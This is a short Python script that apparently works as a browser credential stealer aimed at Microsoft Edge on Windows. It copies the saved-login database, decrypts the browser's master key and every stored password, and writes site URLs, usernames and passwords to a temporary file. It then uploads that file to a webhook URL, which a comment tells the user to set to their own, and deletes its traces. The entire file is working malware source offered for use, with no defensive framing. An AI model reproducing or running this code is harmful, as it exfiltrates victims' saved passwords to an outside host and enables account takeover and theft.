# see the requirements before running
import os
import sqlite3
import json
import shutil
import win32crypt
import base64
import requests
from Cryptodome.Cipher import AES

EDGE_PATH = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Default", "Login Data")
TEMP_PATH = os.path.join(os.getenv("TEMP"), "LoginDataCopy.db")
PASSWORDS_PATH = os.path.join(os.getenv("TEMP"), "passwords.txt")
WEBHOOK_URL = "webhook" # change to ur webhook 

def get_encryption_key():
    key_path = os.path.join(os.getenv("LOCALAPPDATA"), "Microsoft", "Edge", "User Data", "Local State")
    with open(key_path, "r", encoding="utf-8") as file:
        local_state = json.load(file)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

def decrypt_password(encrypted_password, key):
    try:
        if encrypted_password[:3] == b'v10':
            iv = encrypted_password[3:15]
            encrypted_password = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(encrypted_password[:-16])
            return decrypted_pass.decode()
        else:
            return win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1].decode()
    except:
        return "[Unable to decrypt]"

def extract_passwords():
    shutil.copy2(EDGE_PATH, TEMP_PATH)
    conn = sqlite3.connect(TEMP_PATH)
    cursor = conn.cursor()
    
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    key = get_encryption_key()
    
    with open(PASSWORDS_PATH, "w", encoding="utf-8") as file:
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            if username and encrypted_password:
                password = decrypt_password(encrypted_password, key)
                file.write(f"Website: {url}\nUsername: {username}\nPassword: {password}\n{'-'*50}\n")
    
    conn.close()
    os.remove(TEMP_PATH)
    
    with open(PASSWORDS_PATH, "rb") as file:
        requests.post(WEBHOOK_URL, files={"file": file})
    os.remove(PASSWORDS_PATH)

if __name__ == "__main__":
    extract_passwords()
